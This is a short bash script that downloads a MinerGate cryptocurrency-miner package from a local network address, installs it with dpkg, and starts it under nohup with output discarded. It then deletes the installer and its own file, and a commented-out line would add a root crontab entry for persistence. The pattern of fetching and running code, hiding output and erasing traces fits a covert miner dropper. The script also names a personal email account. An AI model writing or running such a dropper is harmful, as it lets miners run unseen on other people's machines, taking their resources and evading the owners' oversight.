#!/bin/bash

wget http://192.168.0.20/minergate-cli-8.2-amd64.deb
sleep 10
dpkg -i minergate-cli-8.2-amd64.deb
sleep 10
#echo "* * * * *	root	nohup minergate-cli --user cappelozzi@gmail.com --bcn 1 >> /dev/null &" >> /etc/crontab
sleep 20
rm minergate-cli-8.2-amd64.deb | rm miner.sh | nohup minergate-cli --user cappelozzi@gmail.com --bcn 1 >> /dev/null & 

